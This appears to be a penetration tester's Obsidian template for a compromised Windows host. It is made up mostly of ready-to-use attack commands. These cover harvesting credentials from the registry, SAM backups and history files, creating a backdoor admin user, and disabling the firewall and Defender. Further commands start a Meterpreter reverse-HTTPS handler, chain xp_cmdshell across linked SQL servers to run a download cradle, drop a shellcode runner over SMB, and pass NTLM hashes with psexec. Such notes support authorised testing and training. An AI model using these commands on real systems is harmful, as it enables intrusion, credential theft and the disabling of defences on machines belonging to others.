## Objective

___
```ad-info
title:Objective 

- This note is used to keep track of the target Windows machine's discovery, privilege escalation, persistence and credential access processes
- This note also contains different cheatsheets and resources to aid in those methodologies
- Feel free to remove any sections that are non-applicable to keep this note compact.
```

> You can execute discovery scripts like PowerUp or SeatBelt to retrieve this information or do it manually.
> Try using simpler scripts to retrieve this info before running overwhelming scripts like `WinPeas.exe`.

```ad-seealso
title: Resources
collapse:yes
*Scripts*:
___
[PowerSploit · PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
[Compiled Binaries for Ghostpack (.NET v4.0)](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
[PEAS (with colors)](https://github.com/peass-ng/PEASS-ng/tree/master)
___
```
___

## Internal Discovery Notes

*Current User Information*

~~~powershell
whoami /all
~~~

*Screenshot*

___

___

*Local Users*

~~~powershell
net user
~~~

*Screenshot*

___

___

*Local Groups*

~~~powershell
net localgroup
~~~

*Screenshot*

___

___

*System Information*

~~~powershell
systeminfo
~~~

*Screenshot*

___

___

*Network Configuration*

~~~powershell
Get-NetIPConfiguration
~~~

*Screenshot*

___

___

*Check Installed Software*

~~~powershell
get-childitem 'C:\Program Files\' | Select-Object Name | Format-Table
~~~

*Screenshot*

___

___

*Check Installed Software x86*

~~~powershell
get-childitem 'C:\Program Files\' | Select-Object Name | Format-Table
~~~

*Screenshot*

___

___

*Root of C:/ Drive Contents*

> Check non-default folders such as "Setup" or "Inetpub" for credentials.

~~~powershell
get-childitem 'C:\' | Select-Object Name | Format-Table
~~~

*Screenshot*

___

___

*Processes*

```powershell
tasklist
```

> At this point, if you have not found anything of interest, try running *automated tools*. Remember to paste relevant screenshots.

*PowerUp.ps1* > *SeatBelt.exe* > *WinPeas.exe*

## Credential Access

> Now that you have a high level understanding of the environment, move onto manual credential harvesting.

Good Resource: [Password Hunting – Windows Privilege Escalation](https://juggernaut-sec.com/password-hunting/)

*Powershell History File*

~~~powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
~~~

> OR

~~~powershell
cat (Get-PSReadlineOption).HistorySavePath
~~~

*Screenshot*

___

___

*IIS Config and Web Files*

> This also applies to non-standard folders such as "Setup" in C:\ or in "Program Files" etc.

~~~powershell
dir C:\inetpub\wwwroot
~~~

> Looking for all sorts of interesting files matching strings.

~~~powershell
Get-Childitem -Recurse C:\inetpub | findstr -i "directory config txt aspx ps1 bat xml pass user"
~~~

> Apache version

~~~powershell
Get-Childitem -Recurse C:\apache | findstr -i "directory config txt php ps1 bat xml pass user"
~~~

> Xampp version

~~~powershell
Get-Childitem -Recurse C:\xampp | findstr -i "directory config txt php ps1 bat xml pass user"
~~~

*Screenshots*
___

___

*Passwords in Registry Keys*

~~~powershell
reg query HKLM /f password /t REG_SZ /s; reg query HKLU /f password /t REG_SZ /s
~~~

~~~powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
~~~

~~~powershell
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"; reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"; reg query "HKCU\Software\ORL\WinVNC3\Password"; reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
~~~

*Screenshot*

___

___

*SAM and SYSTEM Backup Files*

~~~powershell
cd C:\ & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK
~~~

> Then run icacls on these files to see if you can copy them. If you can, transfer them to Kali and dump creds.

~~~powershell
impacket-secretsdump -sam SAM.OLD -system SYSTEM.OLD LOCAL
~~~

*Screenshot*

___

___

*Unattended Files*

~~~powershell
dir C:\unattend.xml; dir C:\Windows\Panther\Unattend.xml; dir C:\Windows\Panther\Unattend\Unattend.xml; dir C:\Windows\system32\sysprep.xml; dir C:\Windows\system32\sysprep\sysprep.xml
~~~

*Screenshot*
___

___

*Alternate Data Streams*

> Looking for data hidden in a suspicious file.

~~~powershell
dir /R
~~~

*Example*:
![[Pasted image 20240428140516.png]]

~~~powershell
more < NothingToSeeHere.txt:secret.txt:$DATA
~~~

*Screenshots*
___

___

*Hidden Files*

> By default `ls` from within Meterpreter will show all files.

~~~powershell
dir /a C:\
~~~

*Screenshot*
___

___

*Interesting File Names*

> Try these inside of web directories, /program files/ directories and user home directories.

~~~powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *user*
~~~

~~~powershell
findstr /SI "passw pwd" *.xml *.ini *.txt *.ps1 *.bat *.config
~~~

*Screenshot*
___

___

*Stored Credentials (Credential Manager)*

~~~powershell
cmdkey /list
~~~

*Example*:
![[Pasted image 20240428140923.png]]

> Testing credentials. If this works, maybe use IEX pointing to a shellcode runner or download and execute a shellcode runner.

~~~powershell
runas /env /noprofile /savecred /user:DOMAIN/HOST\administrator "cmd.exe /c whoami > C:\temp\whoami.txt"
~~~

*Screenshot*
___

___

## Privilege Escalation

~~~dataview
list from #windows 
and #privilegeescalation 
~~~

> At this point if you have found a viable vector, exploit it and document it in the block below.

*Privilege Escalation Summary*

Privilege escalation was performed on HOSTNAME via XXX.

*Screenshots*

___

___

> If you haven't found anything move on, a misconfiguration might grant you dangerous privileges, or you already found viable credentials.

## Persistence 

> You can create a backdoor user, or add an already compromised user to localgroup administrators, or more intricate attacks.

Useful Resource: [Window’s Persistence – Manual Techniques - Juggernaut-Sec](https://juggernaut-sec.com/windows-persistence-manual-techniques/)

~~~dataview
list from #windows 
or #activedirectory 
and #persistence 
~~~

*Backdoor User Windows Persistence*

```powershell
net user backdoor Password123! /add; net localgroup administrators backdoor /add
```

## Defense Impairment

> If possible turn AV and Firewall off.

*Firewall OFF*

```powershell
netsh Advfirewall set allprofiles state off
```

*Defender OFF*

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true
```

*Defender OFF using `sc.exe`*:

```powershell
sc.exe config WinDefend start= disabled
```

```powershell
sc.exe stop WinDefend
```

## Port Redirection

> Sometimes you need to access a remote machine's port or make your machine accessible to transfer tools. Here you have a cheatsheet for port redirection techniques.

Useful Resources: 

[Port Forwarding – Windows Privilege Escalation](https://juggernaut-sec.com/port-forwarding/)
[Metasploit Unleashed | Portfwd](https://www.offsec.com/metasploit-unleashed/portfwd/)
[Pivoting in Metasploit | Metasploit Documentation Penetration Testing Software, Pen Testing Security](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)

```ad-example
title:Port Forwarding with NetSh (Windows)

- Establish an IPV4 to IPV4 port forward

~~~powershell
netsh interface portproxy add v4tov4 listenport=LOCAL_PORT listenaddress=LOCAL_IP connectport=REMOTE_PORT connectaddress=REMOTE_IP
~~~

- The following commands validate current portproxy rules

List IPv4 rules

~~~powershell
netsh interface portproxy show v4tov4 
~~~

List all rules

~~~powershell
netsh interface portproxy show all 
~~~

- Remove established rules

~~~powershell
netsh interface portproxy delete v4tov4 listenport=9090 listenaddress=localhost
~~~
```

```ad-example
title: Meterpreter AutoRoute + Listener

These commands are useful when you are about to compromise a machine and know the subnet where the other target machines are connected. 

You want to run a shellcode runner to connect to your meterpreter listener. Once the connection is established this command will make an autoroute SOCKS5 session, and you will be able to connect to the other machines via proxychains.

> Remember to change the subnet IP address when using these.

*x64*

~~~bash
msfconsole -q -x "use auxiliary/server/socks_proxy; set SRVPORT 1080; set SRVHOST 127.0.0.1; run -j; use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 443; set AutoRunScript 'autoroute -s 172.16.231.0/24'; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; run"
~~~

*x86*

~~~bash
msfconsole -q -x "use auxiliary/server/socks_proxy; set SRVPORT 1080; set SRVHOST 127.0.0.1; run -j; use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 443; set AutoRunScript 'autoroute -s 172.16.231.0/24'; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; run"
~~~
```

*Screenshots*

___

___

## Credential Access (OS Credential Dumping)

> If you have obtained privileged access to the host, take a moment to dump credentials from LSASS using mimikatz.

*Commands Removed due to AV false positives.*

## Lateral Movement 

```ad-seealso
title:Lateral Movement Techniques
collapse:true 

~~~dataview
list from #lateralmovement 
and #windows
sort file.name asc
~~~
```

```ad-example
title: Convert Kerberos Tickets

Converting a ccache file found in tmp: 

~~~bash
impacket-ticketConverter krb5cc_ ticket.kirbi
~~~

Converting kirbi to ccache

~~~bash
impacket-ticketConverter ticket.kirbi krb5cc_
~~~

Injecting ticket with Rubeus: 

~~~powershell
Rubeus.exe ptt /ticket:ticket.kirbi
~~~
```

*Screenshots*

___

___

```ad-example
title: MSSQL Lateral Movement

[MSSQL AD Abuse | HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql)
[Pentesting MSSQL | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
[MSSQL Injection | PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
[SQL injection cheat sheet | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)


Enable xp_cmdshell on current machine (one-liner)

~~~sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell DOWNLOADCRADLE'
~~~

Enable xp_cmdshell on current machine impersonating 'sa'

~~~sql
EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell DOWNLOADCRADLE'
~~~

Enable xp_cmdshell on remote machine impersonating 'sa'

~~~sql
EXECUTE AS LOGIN = 'sa';
EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT TARGET
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT TARGET
EXEC ('xp_cmdshell ''powershell DOWNLOADCRADLE'' ') AT TARGET
~~~

Enable xp_cmdshell by executing query on remote machine, targeting your machine; impersonating 'sa'. Double jump

~~~sql
EXECUTE AS LOGIN = 'sa';
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT TARGET') AT TARGET_2
EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT TARGET') AT TARGET_2
EXEC ('EXEC (''xp_cmdshell ''''<your cmd here>'''''') AT TARGET') AT TARGET_2
EXEC ('EXEC (''xp_cmdshell ''''powershell -enc XXXXX'''''') AT TARGET') AT TARGET_2
~~~

Enable xp_cmdshell by executing query on remote machine, targeting your machine; impersonating 'sa'. Triple jump.

~~~sql
EXEC ('EXEC (''EXEC ('''' sp_configure ''''''''show advanced options'''''''', 1; reconfigure; '''') AT TARGET '') AT TARGET_2') AT TARGET
EXEC ('EXEC (''EXEC ('''' sp_configure ''''''''xp_cmdshell'''''''', 1; reconfigure; '''') AT TARGET '') AT TARGET_2') AT TARGET
EXEC ('EXEC (''EXEC ('''' xp_cmdshell ''''''''powershell DOWNLOADCRADLE'''''''' '''') AT TARGET '') AT TARGET_2') AT TARGET
~~~
```

*Screenshots*

___

___

~~~ad-example
title:PSExec + SMBClient Lateral Movement 

*New PSExec Session + SMBClient Session*

```bash
proxychains impacket-psexec USER@TARGET -hashes :NTLM
```

```bash
proxychains impacket-smbclient USER@TARGET -hashes :NTLM
```

*Put Malware Using SMBClient*

```bash
use c$
cd /windows/tasks
put NR.exe
```

> Run the shellcode runner using the psexec session (EntryPoint Stomping Process Injection)

```bash
use c$
C:\windows\tasks\NR.exe -epi
```
~~~

*Screenshots*

___

___

> Enumerate access to the other machines in your target list using your new credentials.

```bash
crackmapexec PROTOCOL -k ips.lst -u "USER" -p "PASSWORD"
```

> Also check in which machines your target user has a session on and then move there using his credentials. (use Bloodhound or PowerView for this check).

~~~ad-important
title:Lateral Movement Vectors

Enumerate findings here.
___

___
~~~

*Create a link here to the next machine's note, continue attacking.*